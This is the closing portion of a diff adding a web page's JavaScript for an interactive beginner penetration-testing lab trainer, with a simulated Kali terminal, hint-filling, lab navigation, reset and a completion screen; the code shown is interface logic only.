+  inputLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output">$ </span><input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false">`;
+  tb.appendChild(inputLine);
+  const inp = document.getElementById('termInput');
+  if(inp){ inp.focus(); bindInput(inp); }
+}
+
+function showSolution(){
+  const lab = LABS[currentLab];
+  if(currentStep >= lab.steps.length) return;
+  const step = lab.steps[currentStep];
+  const inp = document.getElementById('termInput');
+  if(inp){
+    const match = step.hint.match(/<code>([^<]+)<\/code>/);
+    if(match){
+      inp.value = match[1].replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/&quot;/g,'"').replace(/&#39;/g,"'");
+      inp.focus();
+    }
+  }
+}
+
+function selectLab(idx){
+  if(idx === currentLab) return;
+  currentLab = idx;
+  currentStep = 0;
+  commandHistory = [];
+  historyIdx = -1;
+  renderSidebar();
+  renderLab();
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function nextLab(){
+  if(currentLab < LABS.length - 1){
+    currentLab++;
+    currentStep = 0;
+    commandHistory = [];
+    historyIdx = -1;
+    renderSidebar();
+    renderLab();
+    window.scrollTo({top:0, behavior:'smooth'});
+  } else {
+    showFinalScreen();
+  }
+}
+
+function resetCurrent(){
+  currentStep = 0;
+  commandHistory = [];
+  historyIdx = -1;
+  renderLab();
+}
+
+function showFinalScreen(){
+  const area = document.getElementById('content');
+  area.innerHTML = `
+    <div style="text-align:center;padding:50px 20px;">
+      <div style="width:80px;height:80px;border-radius:50%;background:var(--accent-dim);border:2px solid var(--accent-mid);display:inline-flex;align-items:center;justify-content:center;font-size:2rem;color:var(--accent);margin-bottom:24px;">
+        <i class="fas fa-flag-checkered"></i>
+      </div>
+      <h1 style="font-size:2rem;color:var(--fg-bright);margin-bottom:12px;">All Beginner Labs Complete!</h1>
+      <p style="color:var(--fg-dim);max-width:600px;margin:0 auto 32px;line-height:1.7;">
+        You've successfully set up your lab, scanned a target, analyzed traffic, and exploited a real vulnerability!
+      </p>
+      <button class="btn primary" onclick="currentLab=0;currentStep=0;renderSidebar();renderLab();">
+        <i class="fas fa-rotate-left"></i> Start Over
+      </button>
+    </div>
+  `;
+}
+
+// ============================================================
+// BOOT
+// ============================================================
+document.addEventListener('DOMContentLoaded', ()=>{
+  renderSidebar();
+  renderLab();
+});
+
+document.addEventListener('click', e=>{
+  if(e.target.closest('.terminal-body') && !e.target.closest('.term-btn')){
+    const inp = document.getElementById('termInput');
+    if(inp) inp.focus();
+  }
+});
+</script>
+</body>
+</html>
